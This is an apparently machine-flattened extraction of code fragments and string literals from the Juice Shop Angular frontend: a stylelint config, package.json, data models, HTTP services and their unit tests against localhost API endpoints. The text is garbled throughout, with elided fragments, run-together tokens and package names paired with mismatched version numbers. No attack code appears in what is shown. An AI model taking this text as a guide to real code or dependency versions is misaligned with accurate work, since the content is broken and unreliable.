Drive/Git/juice-shop/frontend/.stylelintrc.js'stylelint-config-sass-guidelines''stylelint-scss''selector-max-id''selector-max-compound-selectors''selector-pseudo-element-no-unknown''ignorePseudoElements''ng-deep''property-no-vendor-prefix''value-no-vendor-prefix''selector-no-vendor-prefix''selector-no-qualifying-type''selector-class-pattern'extends ... elines''stylel ... elines'stylelint-config-sass-guidelinesplugins ... s'\r\n  ]stylelint-scssrules:  ... ll\r\n  }{\r\n     ... ll\r\n  }'selector-max-id': 1selector-max-id'select ... ors': 4'select ... ectors'selector-max-compound-selectors'select ... \r\n    ]'select ... nknown'selector-pseudo-element-no-unknown'ignore ... -deep']'ignore ... ements'ignorePseudoElements['ng-deep']ng-deep'proper ... ': null'proper ... prefix'property-no-vendor-prefix'value- ... ': null'value- ... prefix'value-no-vendor-prefix'select ... ': null'select ... prefix'selector-no-vendor-prefix'select ... g-type'selector-no-qualifying-type'select ... attern'selector-class-patternP:/My Drive/Git/juice-shop/frontend/package.json{\r\n  "n ... \n  }\r\n}"frontend"frontend"17.0.0"17.0.0{\r\n     ... ""\r\n  }"ng"ng"ng serve"ng serve"ng build"ng build"ng test"ng test"ng lint"ng lint"npx st ... scss\""npx stylelint "**/*.scss""npx stylelint \"**/*.scss\""lint:scss"ngcc - ... json\""ngcc --tsconfig "./src/tsconfig.app.json""ngcc --tsconfig \"./src/tsconfig.app.json\""postinstall{\r\n     ... 1"\r\n  }"^15.0.0"^15.0.0@angular-builders/custom-webpack"^15.0.4"^15.0.4@angular-devkit/build-angular"^6.0.0"^6.0.0@angular-material-extensions/password-strength@angular/animations"^14.0.4"^14.0.4@angular/cdk@angular/cli@angular/common@angular/compiler@angular/compiler-cli@angular/core"10.0.0-beta.32"10.0.0-beta.32@angular/flex-layout@angular/forms"^8.0.0-beta.10"^8.0.0-beta.10@angular/http@angular/material@angular/platform-browser@angular/platform-browser-dynamic@angular/router"^6.1.0"^6.1.0@ctrl/ngx-codemirror"^3.6.0"^3.6.0@cyclonedx/webpack-plugin"~1.2.30"~1.2.30@fortawesome/fontawesome-svg-core"^5.14.0"^5.14.0@fortawesome/free-brands-svg-icons@fortawesome/free-regular-svg-icons@fortawesome/free-solid-svg-icons"10.0.1"10.0.1@nguniversal/express-engine"^13.0.0"^13.0.0@ngx-translate/core@ngx-translate/http-loader"^0.5.8"^0.5.8@wagmi/core"~2.0.3"~2.0.3anuglar2-qrcode"^1.4.0"^1.4.0canvas-confetti"^5.65.14"^5.65.14codemirror"^0.2.5"^0.2.5codemirror-solidity"^3.22.5"^3.22.5core-js"^5.7.2"^5.7.2ethers"^2.0.2"^2.0.2file-saver"^6.9.2"^6.9.2flag-icons"^2.4.1"^2.4.1font-mfizz"^2.2.0"^2.2.0jwt-decode"^4.17.21"^4.17.21lodash-es"^0.3.1"^0.3.1material-icons"^12.0.1"^12.0.1ng-mat-search-bar"^1.3.0-beta.11"^1.3.0-beta.11ng-simple-slideshowng2-file-upload"^15.1.0"^15.1.0ngx-clipboardngx-cookie"^6.1.2"^6.1.2ngx-highlightjs"^0.6.0"^0.6.0ngx-text-diffngx-window-token"6.6.3"6.6.3rxjs"^1.32.2"^1.32.2sass"^1.2.2"^1.2.2snarkdown"^3.1.0"^3.1.0socket.io-client"^1.1.0"^1.1.0solidity-browser-compiler"~4.8.4"~4.8.4"~0.11.4"~0.11.4zone.js"4.4.1"4.4.1zustand{\r\n     ... 0"\r\n  }"^0.8.0-beta.7"^0.8.0-beta.7@angular-eslint/builder@angular/language-service"^4.17.9"^4.17.9@types/express-serve-static-core"^2.0.1"^2.0.1@types/file-saver"~3.9.1"~3.9.1@types/jasmine"^2.0.10"^2.0.10@types/jasminewd2"^2.2.1"^2.2.1@types/jwt-decode"^17.0.36"^17.0.36@types/node"^1.4.33"^1.4.33@types/socket.io-client"^6.7.2"^6.7.2@typescript-eslint/eslint-plugin@typescript-eslint/eslint-plugin-tslintcodelyzer"^8.49.0"^8.49.0eslint"^39.0.0"^39.0.0eslint-config-standard-with-typescript"^2.28.1"^2.28.1eslint-plugin-import"^11.1.0"^11.1.0eslint-plugin-node"^6.1.1"^6.1.1eslint-plugin-promise"7.1.0"7.1.0eslint-config-prettier"^30.7.9"^30.7.9eslint-plugin-jsdoc"^4.1.0"^4.1.0eslint-plugin-standard"^3.9.0"^3.9.0"~3.9.0"~3.9.0jasmine-core"~7.0.0"~7.0.0jasmine-spec-reporter"^6.0.3"^6.0.3karma"~3.1.0"~3.1.0karma-chrome-launcher"^2.0.3"^2.0.3karma-coverage"~4.0.1"~4.0.1karma-jasmine"^1.7.0"^1.7.0karma-jasmine-html-reporter"^13.8.0"^13.8.0stylelint"^7.1.0"^7.1.0"^3.18.0"^3.18.0"^10.8.0"^10.8.0ts-nodedevDependenciesP:/My Drive/Git/juice-shop/frontend/src/app/Models/backup.model.tsP:/My Drive/Git/juice-shop/frontend/src/app/ModelsP:/My Drive/Git/juice-shop/frontend/src/appP:/My Drive/Git/juice-shop/frontend/srcBackupcontinueCodecontinueCodeFindItcontinueCodeFixItbannerswelcomeBannerStatuscookieConsentStatusexport  ... ng }\r\n}interfa ... ng }\r\n}version: numbercontinu ...  stringlanguage?: stringbanners ... tring }{ welco ... tring }welcome ... string,cookieC ...  stringP:/My Drive/Git/juice-shop/frontend/src/app/Models/challenge.model.tsSafeHtml'@angular/platform-browser'hasTutorialhasSnippetimport  ... rowser''@angul ... rowser'type SafeHtmltags?: stringdescrip ... afeHtmlstring | SafeHtmldifficu ... | 5 | 61 | 2 | ... | 5 | 6hint?: stringhintUrl?: stringdisabledEnv?: stringsolved?: booleantutoria ...  numberhasTuto ... booleanhasSnippet?: booleancodingC ... | 1 | 20 | 1 | 2P:/My Drive/Git/juice-shop/frontend/src/app/Models/deliveryMethod.model.tsDeliveryMethodP:/My Drive/Git/juice-shop/frontend/src/app/Models/product.model.tspointsimage: stringpoints: numberP:/My Drive/Git/juice-shop/frontend/src/app/Models/review.model.ts_id: stringmessage: stringP:/My Drive/Git/juice-shop/frontend/src/app/Models/securityQuestion.model.tsP:/My Drive/Git/juice-shop/frontend/src/app/Services/address.service.spec.tsP:/My Drive/Git/juice-shop/frontend/src/app/ServicesHttpClientTestingModuleHttpTestingController'@angular/common/http/testing'fakeAsyncinjectTestBedtick'@angular/core/testing'AddressService'./address.service''AddressService'configureTestingModuleproviders'should be created'toBeTruthy'should get address directly from the api'httpMockexpectOne'http://localhost:3000/api/Addresss''apiResponse'toBe'GET''should get single address directly from the api'getById'http://localhost:3000/api/Addresss/1''should create address directly from the api''http://localhost:3000/api/Addresss/''POST''should update address directly from the api''PUT''should delete address directly from the api'del'DELETE'import  ... esting''@angul ... esting'@angular/common/http/testingHttpCli ... gModuleHttpTes ... troller@angular/core/testingimport  ... ervice'./address.service/addressdescrib ...  ))\r\n})() => { ...   ))\r\n}{\r\n  be ...   ))\r\n}beforeE ... )\r\n  })() => { ... })\r\n  }TestBed ... \n    })TestBed ... gModuleconfigu ... gModuleimports ... Module][HttpCl ... Module]provide ... ervice][AddressService]it('sho ... \r\n  }))should be createdinject( ... )\r\n  })(servic ... ()\r\n  }expect( ... ruthy()expect( ... eTruthyexpect(service)it('sho ... )\r\n  ))'should ... he api'should get address directly from the apiinject( ... })\r\n  )[Addres ... roller]fakeAsy ... \n    })(servic ... \r\n    }let resservice ...  data))service ... bscribeservice.get()service.get(data)  ... = data)(res = data)res = dataconst r ... resss')req = h ... resss')httpMoc ... resss')httpMock.expectOne'http:/ ... dresss'http://localhost:3000/api/Addresssreq.flu ... nse' })req.flush{ data: ... onse' }data: 'apiResponse'apiResponsetick()expect( ... ('GET')expect( ... d).toBeexpect( ... method)req.request.methodreq.requestGETexpect( ... ponse')expect(res).toBeexpect(res)httpMock.verify()httpMock.verifyshould get single address directly from the apiservice.getById(1)service.getByIdconst r ... sss/1')req = h ... sss/1')httpMoc ... sss/1')'http:/ ... esss/1'http://localhost:3000/api/Addresss/1should create address directly from the apiservice.save({})service.saveconst r ... esss/')req = h ... esss/')httpMoc ... esss/')'http:/ ... resss/'http://localhost:3000/api/Addresss/expect( ... 'POST')POSTshould update address directly from the apiservice.put(1, {})service.putexpect( ... ('PUT')PUTshould delete address directly from the apiservice.del(1)service.delexpect( ... ELETE')DELETEP:/My Drive/Git/juice-shop/frontend/src/app/Services/address.service.ts eslint-disable-next-line @typescript-eslint/restrict-template-expressions// esli ... essions'../../environments/environment'Injectable'@angular/core'HttpClient'@angular/common/http'catchError'rxjs/operators'providedIn'root'hostServer}/${'/'import  ... onment''../../ ... onment'../../environments/environment/environments/environmentimport  ... r/core'import  ... n/http''@angul ... n/http'@angular/common/httpimport  ... rators'rxjs/operatorsclass A ... \n  }\r\n}@Inject ... ot'\r\n})Injecta ... ot'\r\n}){\r\n  pr ... oot'\r\n}providedIn: 'root'private ... tServerenviron ... tServerprivate ... dresss'this.ho ... dresss'this.hostServerconstru ... nt) { }get ()  ... ))\r\n  }return  ... err }))this.ht ... err }))this.ht ... t).pipethis.ht ... s.host)this.http.getthis.httpthis.hostmap((re ... e.data)(respon ... se.dataresponse.datacatchEr ...  err })(err) = ... w err }{ throw err }getById ... ))\r\n  }this.ht ... `).pipethis.ht ... ${id}`)`${this.host}/${id}`(err: E ... w err }save (p ... ))\r\n  }this.ht ... s).pipethis.ht ... params)this.http.postthis.host + '/'put (id ... ))\r\n  }this.http.putdel (id ... ))\r\n  }this.http.deleteprivate ... pClientP:/My Drive/Git/juice-shop/frontend/src/app/Services/administration.service.spec.tsAdministrationService'./administration.service''AdministrationService''should get application version directly from the rest api'getApplicationVersion'http://localhost:3000/rest/admin/application-version''./admi ... ervice'./administration.service/administrationAdminis ... Service'Admini ... ervice'[Admini ... ervice]'should ... st api'should get application version directly from the rest api[Admini ... roller]let res: anyres: anyservice ... rsion()service ... VersiongetAppl ... Versionconst r ... rsion')req = h ... rsion')httpMoc ... rsion')'http:/ ... ersion'http://localhost:3000/rest/admin/application-version{ versi ... onse' }version ... sponse'P:/My Drive/Git/juice-shop/frontend/src/app/Services/administration.service.ts'/rest/admin''/application-version'private ... /admin'this.ho ... /admin'/rest/admingetAppl ...  )\r\n  }{\r\n     ...  )\r\n  }return  ... \r\n    )this.ht ... \r\n    )this.ht ... ').pipethis.ht ... rsion')this.ho ... ersion''/appli ... ersion'/application-versionmap((re ... ersion)(respon ... versionresponse.versioncatchEr ... rror })(error: ... error }{ throw error }throw errorP:/My Drive/Git/juice-shop/frontend/src/app/Services/basket.service.spec.tsBasketService'./basket.service''BasketService''should get basket directly from the rest api''http://localhost:3000/rest/basket/1''should get single basket item directly from the rest api''http://localhost:3000/api/BasketItems/1''should create basket item directly from the rest api''http://localhost:3000/api/BasketItems/''should update basket item directly from the rest api''should delete basket item directly from the rest api''should place order for basket via the rest api'checkout'http://localhost:3000/rest/basket/1/checkout'orderConfirmation'should apply coupon to basket via the rest api'applyCoupon'1234567890''http://localhost:3000/rest/basket/1/coupon/1234567890'./basket.service/basket[BasketService]should get basket directly from the rest api[Basket ... roller]service.find(1)service.findconst r ... ket/1')req = h ... ket/1')httpMoc ... ket/1')'http:/ ... sket/1'http://localhost:3000/rest/basket/1should get single basket item directly from the rest apiservice.get(1)const r ... ems/1')req = h ... ems/1')httpMoc ... ems/1')'http:/ ... tems/1'http://localhost:3000/api/BasketItems/1should create basket item directly from the rest apiservice.save()const r ... tems/')req = h ... tems/')httpMoc ... tems/')'http:/ ... Items/'http://localhost:3000/api/BasketItems/should update basket item directly from the rest apishould delete basket item directly from the rest apishould place order for basket via the rest apiservice.checkout(1)service.checkoutconst r ... ckout')req = h ... ckout')httpMoc ... ckout')'http:/ ... eckout'http://localhost:3000/rest/basket/1/checkout{ order ... onse' }orderCo ... sponse'should apply coupon to basket via the rest apiservice ... 67890')service.applyCouponconst r ... 67890')req = h ... 67890')httpMoc ... 67890')'http:/ ... 567890'http://localhost:3000/rest/basket/1/coupon/1234567890{ disco ... onse' }discoun ... sponse'P:/My Drive/Git/juice-shop/frontend/src/app/Services/basket.service.ts eslint-disable-next-line @typescript-eslint/restrict-plus-operands// esli ... perandsObservableSubject'rxjs'OrderDetailpaymentIdaddressIddeliveryMethodIdpublicitemTotal}/rest/basket/${couponDataorderDetails}/checkout`coupon}/coupon/${updateNumberOfCartItems'bid'ProductsgetItemTotalasObservableimport  ...  'rxjs'type ObservablepaymentId: stringaddressId: stringdeliver ...  stringclass B ... \n  }\r\n}public  ... tServerpublic  ... <any>()new Subject<any>()private ... tItems'this.ho ... tItems'find (i ... ))\r\n  }return  ... ror }))this.ht ... ror }))`${this ... /${id}`/rest/basket/(error) ... error }get (id ... ))\r\n  }checkou ... ))\r\n  }this.ht ... }).pipethis.ht ... ails })`${this ... eckout`/checkout{ coupo ... tails }map((re ... mation)(respon ... rmationrespons ... rmationapplyCo ... ))\r\n  }this.ht ... }`, {})`${this ... oupon}`/coupon/map((re ... scount)(respon ... iscountresponse.discountupdateN ... })\r\n  }updateN ... rtItemsthis.fi ... err) })this.fi ... bscribethis.fi ... ), 10))this.findparseIn ... '), 10)session ... ('bid')session ... getItembid(basket ... \r\n    }this.it ... ty, 0))this.itemTotal.nextthis.itemTotalbasket. ... ity, 0)basket. ... .reducebasket.Products(itemTo ... uantityitemTot ... uantityproduct ... uantityproduct.BasketItem(err) = ... (err) }{ console.log(err) }console.log(err)console.loggetItem ... ()\r\n  }Observable<any>return  ... vable()this.it ... vable()this.it ... ervableP:/My Drive/Git/juice-shop/frontend/src/app/Services/captcha.service.spec.tsCaptchaService'./captcha.service''CaptchaService''should get captcha directly from the rest api'getCaptcha'http://localhost:3000/rest/captcha/'./captcha.service/captcha[CaptchaService]should get captcha directly from the rest api[Captch ... roller]service.getCaptcha()service.getCaptchaconst r ... tcha/')req = h ... tcha/')httpMoc ... tcha/')'http:/ ... ptcha/'http://localhost:3000/rest/captcha/req.flu ... ponse')P:/My Drive/Git/juice-shop/frontend/src/app/Services/captcha.service.ts'/rest/captcha'class C ... \n  }\r\n}private ... aptcha'this.ho ... aptcha'/rest/captchagetCapt ... ))\r\n  }this.ht ...  + '/')P:/My Drive/Git/juice-shop/frontend/src/app/Services/challenge.service.spec.tsChallengeService'./challenge.service''ChallengeService''should get all challenges directly from the rest api''http://localhost:3000/api/Challenges/''should get current continue code directly from the rest api''http://localhost:3000/rest/continue-code''should pass continue code for restoring challenge progress on to the rest api'restoreProgress'CODE''http://localhost:3000/rest/continue-code/apply/CODE''should get current "Find It" coding challenge continue code directly from the rest api''http://localhost:3000/rest/continue-code-findIt''should pass "Find It" coding challenge continue code for restoring progress on to the rest api'restoreProgressFindIt'http://localhost:3000/rest/continue-code-findIt/apply/CODE''should get current "Fix It" coding challenge continue code directly from the rest api''http://localhost:3000/rest/continue-code-fixIt''should pass "Fix It" coding challenge continue code for restoring progress on to the rest api'restoreProgressFixIt'http://localhost:3000/rest/continue-code-fixIt/apply/CODE''should repeat notification directly from the rest api'repeatNotification'CHALLENGE''http://localhost:3000/rest/repeat-notification''challenge''./chal ... ervice'./challenge.service/challengeimports ...       ][ChallengeService]should get all challenges directly from the rest api[Challe ... roller]service.find()const r ... nges/')req = h ... nges/')httpMoc ... nges/')'http:/ ... enges/'http://localhost:3000/api/Challenges/should get current continue code directly from the rest apiservice ... eCode()service.continueCodeconst r ... -code')req = h ... -code')httpMoc ... -code')'http:/ ... e-code'http://localhost:3000/rest/continue-code{ conti ... onse' }continu ... sponse'should pass continue code for restoring challenge progress on to the rest apiservice ... 'CODE')service ... rogressCODEconst r ... /CODE')req = h ... /CODE')httpMoc ... /CODE')'http:/ ... y/CODE'http://localhost:3000/rest/continue-code/apply/CODEshould get current "Find It" coding challenge continue code directly from the rest apiservice ... indIt()service ... eFindItconst r ... indIt')req = h ... indIt')httpMoc ... indIt')'http:/ ... findIt'http://localhost:3000/rest/continue-code-findItshould pass "Find It" coding challenge continue code for restoring progress on to the rest apiservice ... sFindItrestore ... sFindIthttp://localhost:3000/rest/continue-code-findIt/apply/CODEshould get current "Fix It" coding challenge continue code directly from the rest apiservice ... FixIt()service ... deFixItconst r ... fixIt')req = h ... fixIt')httpMoc ... fixIt')'http:/ ... -fixIt'http://localhost:3000/rest/continue-code-fixItshould pass "Fix It" coding challenge continue code for restoring progress on to the rest apiservice ... ssFixIthttp://localhost:3000/rest/continue-code-fixIt/apply/CODEshould repeat notification directly from the rest apiservice ... LENGE')service ... icationCHALLENGEconst r ... ation')req = h ... ation')httpMoc ... ation')req =>  ... cation'req.url ... cation'req.url'http:/ ... cation'http://localhost:3000/rest/repeat-notificationexpect( ... LENGE')expect( ... )).toBeexpect( ... enge'))req.req ... lenge')req.req ... ams.getreq.request.paramsP:/My Drive/Git/juice-shop/frontend/src/app/Services/challenge.service.ts'../Models/challenge.model'challengeName'/rest/repeat-notification''text''/rest/continue-code''/rest/continue-code-findIt''/rest/continue-code-fixIt''/rest/continue-code/apply/''/rest/continue-code-findIt/apply/''/rest/continue-code-fixIt/apply/'import  ... .model''../Mod ... .model'../Models/challenge.model/Models/challengetype Challengeprivate ... lenges'this.ho ... lenges'find (p ... ))\r\n  }Observa ... enge[]>Challenge[]this.ht ... rams }){ params }repeatN ... ))\r\n  }this.ht ... onst })this.ho ... cation''/rest/ ... cation'/rest/repeat-notification{ param ... const }params: ... eName }{ chall ... eName }challen ... ngeNamerespons ... s const'text' as constcontinu ... ))\r\n  }this.ht ... -code')this.ho ... e-code''/rest/ ... e-code'/rest/continue-codemap((re ... ueCode)(respon ... nueCoderespons ... nueCodethis.ht ... indIt')this.ho ... findIt''/rest/ ... findIt'/rest/continue-code-findItthis.ht ... fixIt')this.ho ... -fixIt''/rest/ ... -fixIt'/rest/continue-code-fixItrestore ... ))\r\n  }this.ht ... de, {})this.ho ... nueCodethis.ho ... apply/''/rest/ ... apply/'/rest/continue-code/apply//rest/continue-code-findIt/apply//rest/continue-code-fixIt/apply/P:/My Drive/Git/juice-shop/frontend/src/app/Services/chatbot.service.spec.tsChatbotService'./chatbot.service''ChatbotService''should get status from the REST API'getChatbotStatus'http://localhost:3000/rest/chatbot/status'toBeNulltoBeTrue'should get query response from the REST API'getResponse'query''apiQuery''http://localhost:3000/rest/chatbot/respond''response'./chatbot.service/chatbot[ChatbotService]'should ... ST API'should get status from the REST API[Chatbo ... roller]service ... tatus()service ... tStatusconst r ... tatus')req = h ... tatus')httpMoc ... tatus')'http:/ ... status'http://localhost:3000/rest/chatbot/status{ statu ... onse' }status: truebody: 'apiResponse'expect( ... eNull()expect( ... oBeNullexpect( ... t.body)req.request.bodyexpect( ... eTrue()expect( ... oBeTrueexpect(res.status)expect( ... y).toBeexpect(res.body)res.bodyshould get query response from the REST APIservice ... Query')service.getResponseapiQueryconst r ... spond')req = h ... spond')httpMoc ... spond')'http:/ ... espond'http://localhost:3000/rest/chatbot/respond{ actio ... onse' }action: 'response'expect( ... Query')expect( ... .query)req.req ... y.queryexpect( ... n).toBeexpect(res.action)res.actionP:/My Drive/Git/juice-shop/frontend/src/app/Services/chatbot.service.ts'/rest/chatbot''/status''/respond'private ... hatbot'this.ho ... hatbot'/rest/chatbotgetChat ... ))\r\n  }this.ht ... tatus')this.ho ... status'/statusmap((re ... sponse)(respon ... esponsegetResp ... ))\r\n  }this.ht ... uery })this.ho ... espond'/respond{ action, query }P:/My Drive/Git/juice-shop/frontend/src/app/Services/code-fixes.service.spec.tsCodeFixesService'./code-fixes.service''CodeFixesService''should get code fixes for challenge directly from the rest api''testChallenge''http://localhost:3000/snippets/fixes/testChallenge'snippettoEqual'should submit solution for "Fit It" phase of coding challenge via the rest api''http://localhost:3000/snippets/fixes'selectedFix'./code ... ervice'./code-fixes.service/code-fixes{\r\n  le ...   ))\r\n}let ser ... Serviceservice ... Service() => { ... e)\r\n  }[CodeFixesService]service ... ervice)TestBed ... ervice)TestBed.injectit('sho ... )\r\n  })() => { ... ()\r\n  }should get code fixes for challenge directly from the rest api[CodeFi ... roller]service ... lenge')testChallengeconst r ... lenge')req = h ... lenge')httpMoc ... lenge')'http:/ ... llenge'http://localhost:3000/snippets/fixes/testChallenge{ snipp ... onse' }snippet ... sponse'expect( ... nse' })expect(res).toEqualshould submit solution for "Fit It" phase of coding challenge via the rest apiservice ... ge', 1)service.checkconst r ... fixes')req = h ... fixes')httpMoc ... fixes')'http:/ ... /fixes'http://localhost:3000/snippets/fixesexpect( ... x: 1 })expect( ... toEqual{ key:  ... ix: 1 }key: 'testChallenge'selectedFix: 1P:/My Drive/Git/juice-shop/frontend/src/app/Services/code-fixes.service.tsverdictFixesSolved'/snippets/fixes'`/${verdict: booleanfixes: string[]challenges: string[]private ... /fixes'this.ho ... /fixes'/snippets/fixesget (ke ... ))\r\n  }Observable<Fixes>this.ht ... {key}`)this.ho ... ${key}``/${key}`check ( ... ))\r\n  }this.ht ... \n    })P:/My Drive/Git/juice-shop/frontend/src/app/Services/code-snippet.service.spec.tsCodeSnippetService'./code-snippet.service''CodeSnippetService''should get single snippet directly from the rest api''http://localhost:3000/snippets/testChallenge''should get list of challenges with code snippets directly from the rest api''http://localhost:3000/snippets''directoryListingChallenge''accessLogDisclosureChallenge''xssBonusChallenge'./code-snippet.service/code-snippet[CodeSnippetService]should get single snippet directly from the rest api[CodeSn ... roller]http://localhost:3000/snippets/testChallengeshould get list of challenges with code snippets directly from the rest apiservice.challenges()service.challengesconst r ... ppets')req = h ... ppets')httpMoc ... ppets')'http:/ ... ippets'http://localhost:3000/snippetsreq.flu ... ge'] }){ chall ... nge'] }challen ... lenge']['direc ... lenge']'direct ... llenge''access ... llenge'expect( ... enge'])P:/My Drive/Git/juice-shop/frontend/src/app/Services/code-snippet.service.tsCodeSnippetvulnLines'/snippets'vulnLines?: number[]number[]snippet: stringprivate ... ippets'this.ho ... ippets'/snippetsObserva ... nippet>`${this ... ${key}`challen ... ))\r\n  }Observable<string[]>this.ht ... host}`)`${this.host}`map((re ... lenges)(respon ... llengesresponse.challengesP:/My Drive/Git/juice-shop/frontend/src/app/Services/complaint.service.spec.tsComplaintService'./complaint.service''ComplaintService''should create complaint directly via the rest api''http://localhost:3000/api/Complaints/''./comp ... ervice'./complaint.service/complaint[ComplaintService]should create complaint directly via the rest api[Compla ... roller]service.save(null)const r ... ints/')req = h ... ints/')httpMoc ... ints/')'http:/ ... aints/'http://localhost:3000/api/Complaints/P:/My Drive/Git/juice-shop/frontend/src/app/Services/complaint.service.tsprivate ... laints'this.ho ... laints'P:/My Drive/Git/juice-shop/frontend/src/app/Services/configuration.service.spec.tsConfigurationService'./configuration.service''ConfigurationService''should get application configuration directly from the rest api'getApplicationConfiguration'http://localhost:3000/rest/admin/application-configuration''8.0.0'showGitHubLinktoBeFalsy'should throw an error on recieving an error from the server''Request failed'404toThrow'./conf ... ervice'./configuration.service/configuration'Config ... ervice'[Config ... ervice]it('sho ... \n    ))should get application configuration directly from the rest apiinject( ... \r\n    )[Config ... roller]fakeAsy ...      })(servic ...       }service ... data })service ... ation()service ... urationgetAppl ... urationdata => ...  data }{ res = data }'http:/ ... ration'http://localhost:3000/rest/admin/application-configurationreq.flu ...      })config: ...       }version: '8.0.0'8.0.0const data = resdata = resexpect( ... 8.0.0')expect(data.version)data.versionexpect( ... Falsy()expect( ... BeFalsyexpect( ... ubLink)data.showGitHubLink'should ... server'should throw an error on recieving an error from the serverservice ... = err))data => ...       }console.log(data)(err) => (res = err)(res = err)res = errreq.err ... led' })req.errornew Err ... ailed')Request failed{ statu ... iled' }status: 404statusT ... failed'const error = reserror = resexpect( ... Throw()expect( ... toThrowexpect( ... ration)expect( ... Be(404)expect( ... s).toBeexpect(error.status)error.statusexpect( ... ailed')expect( ... t).toBeexpect( ... usText)error.statusTextP:/My Drive/Git/juice-shop/frontend/src/app/Services/configuration.service.tsConfigResponseConfigconfigObservable'/application-configuration'interfa ... nfig\r\n}config: Configserver: ... er\r\n  }port: numberapplica ...  }\r\n  }domain: stringlogo: stringfavicon: stringtheme: stringshowVer ... booleanshowGit ... booleanlocalBa ... booleannumberO ...  numberaltcoinName: stringprivacy ...  stringsocial: ... \r\n    }twitterUrl: stringfacebookUrl: stringslackUrl: stringredditUrl: stringpressKitUrl: stringnftUrl: stringquestio ...  stringrecycle ... \r\n    }topProd ...  stringbottomP ...  stringwelcome ... \r\n    }showOnF ... booleantitle: stringcookieC ... \r\n    }dismissText: stringlinkText: stringlinkUrl: stringsecurit ... \r\n    }contact: stringencryption: stringacknowl ...  stringpromoti ... \r\n    }video: stringsubtitles: stringeasterE ... \r\n    }overlayMap: stringgoogleO ... \r\n    }clientId: stringauthori ... : any[]any[]challen ... an\r\n  }{\r\n     ... an\r\n  }showSol ... booleanshowHints: booleanshowMit ... booleancodingC ...  stringrestric ... booleansafetyMode: stringoverwri ...  stringshowFee ... booleanhacking ... ng\r\n  }{\r\n     ... ng\r\n  }isEnabled: booleanavatarImage: stringproducts: any[]memories: any[]ctf: {\r ... []\r\n  }{\r\n     ... []\r\n  }showFla ... booleanshowCou ...  stringcountry ... : any[]private ... le: anygetAppl ...  }\r\n  }Observable<Config>if (thi ... \r\n    }this.co ... ervablereturn  ... ervablethis.co ... rr })))this.ht ... rr })))this.ht ... ation')this.ho ... ration''/appli ... ration'/application-configurationmap((re ... err }))(respon ... .configresponse.configP:/My Drive/Git/juice-shop/frontend/src/app/Services/country-mapping.service.spec.tsCountryMappingService'./country-mapping.service''CountryMappingService''should get the country mapping directly through the rest API'getCountryMapping'http://localhost:3000/rest/country-mapping''./coun ... ervice'./country-mapping.service/country-mappingCountry ... Service'Countr ... ervice'[Countr ... ervice]'should ... st API'should get the country mapping directly through the rest API[Countr ... roller]service ... pping()service ... Mappingconst r ... pping')req = h ... pping')httpMoc ... pping')'http:/ ... apping'http://localhost:3000/rest/country-mappingP:/My Drive/Git/juice-shop/frontend/src/app/Services/country-mapping.service.ts'/rest/country-mapping'getCoun ... ))\r\n  }this.ht ... pping')this.ho ... apping''/rest/ ... apping'/rest/country-mappingP:/My Drive/Git/juice-shop/frontend/src/app/Services/data-subject.service.spec.tsDataSubjectService'./data-subject.service''DataSubjectService''should pass the erasure request directly to the rest API'erase'http://localhost:3000/rest/user/erasure-request''should request data export directly from the rest api'dataExport'http://localhost:3000/rest/user/data-export''./data ... ervice'./data-subject.service/data-subject[DataSubjectService]should pass the erasure request directly to the rest API[DataSu ... roller]service.erase({})service.eraseconst r ... quest')req = h ... quest')httpMoc ... quest')'http:/ ... equest'http://localhost:3000/rest/user/erasure-requestshould request data export directly from the rest apiservice ... port(1)service.dataExportconst r ... xport')req = h ... xport')httpMoc ... xport')'http:/ ... export'http://localhost:3000/rest/user/data-exportexpect( ... toBe(1)P:/My Drive/Git/juice-shop/frontend/src/app/Services/data-subject.service.ts'/rest/user''/erasure-request''/data-export'class D ... \n  }\r\n}private ... t/user'this.ho ... t/user'/rest/usererase ( ...  )\r\n  }this.ho ... equest'/erasure-requestdataExp ... ))\r\n  }this.ho ... export'/data-exportP:/My Drive/Git/juice-shop/frontend/src/app/Services/delivery.service.spec.tsDeliveryService'./delivery.service''DeliveryService''http://localhost:3000/api/Deliverys''http://localhost:3000/api/Deliverys/1'./delivery.service/delivery[DeliveryService][Delive ... roller]const r ... verys')req = h ... verys')httpMoc ... verys')'http:/ ... iverys'http://localhost:3000/api/Deliverysconst r ... rys/1')req = h ... rys/1')httpMoc ... rys/1')'http:/ ... erys/1'http://localhost:3000/api/Deliverys/1P:/My Drive/Git/juice-shop/frontend/src/app/Services/delivery.service.ts'../Models/deliveryMethod.model'DeliveryMultipleMethodResponseDeliverySingleMethodResponse../Models/deliveryMethod.model/Models/deliveryMethodtype DeliveryMethodinterfa ... od[]\r\n}Deliver ... esponsestatus: stringdata: D ... ethod[]DeliveryMethod[]interfa ... thod\r\n}data: DeliveryMethodprivate ... iverys'this.ho ... iverys'P:/My Drive/Git/juice-shop/frontend/src/app/Services/feedback.service.spec.tsFeedbackService'./feedback.service''FeedbackService''should get all feedback directly from the rest api''http://localhost:3000/api/Feedbacks/''should delete feedback directly via the rest api''http://localhost:3000/api/Feedbacks/1''should create feedback directly via the rest api'./feedback.service/feedback[FeedbackService]should get all feedback directly from the rest api[Feedba ... roller]service.find(null)const r ... acks/')req = h ... acks/')httpMoc ... acks/')'http:/ ... backs/'http://localhost:3000/api/Feedbacks/expect( ... ring())req.req ... tring()req.req ... oStringshould delete feedback directly via the rest apiconst r ... cks/1')req = h ... cks/1')httpMoc ... cks/1')'http:/ ... acks/1'http://localhost:3000/api/Feedbacks/1should create feedback directly via the rest apiP:/My Drive/Git/juice-shop/frontend/src/app/Services/feedback.service.ts'/api/Feedbacks'class F ... \n  }\r\n}private ... dbacks'this.ho ... dbacks'/api/FeedbacksP:/My Drive/Git/juice-shop/frontend/src/app/Services/form-submit.service.spec.tsFormSubmitService'./form-submit.service''FormSubmitService''./form ... ervice'./form-submit.service/form-submitdescrib ... }))\r\n})() => { ...  }))\r\n}{\r\n  be ...  }))\r\n}[FormSubmitService]P:/My Drive/Git/juice-shop/frontend/src/app/Services/form-submit.service.ts eslint-disable-next-line import/no-deprecated// esli ... recatedInjectDOCUMENT'@angular/common'_documentattachEnterKeyHandlerformIdsubmitButtonIdonSubmitsubmitButton'keyup'import  ... common'@Inject(DOCUMENT)Inject(DOCUMENT)attachE ... })\r\n  }attachE ... Handlerconst f ... Elementform =  ... Elementthis._d ... Elementthis._d ... formId)this._d ... entByIdthis._documentconst s ... ElementsubmitB ... Elementthis._d ... ttonId)form.ad ... \n    })form.ad ... istenerfunctio ... \r\n    }event.p ... fault()event.preventDefaultif (eve ...       }event.k ... isabledevent.keyCode === 13event.keyCode!submit ... isabledsubmitB ... isabledonSubmit()@Inject ... ocumentP:/My 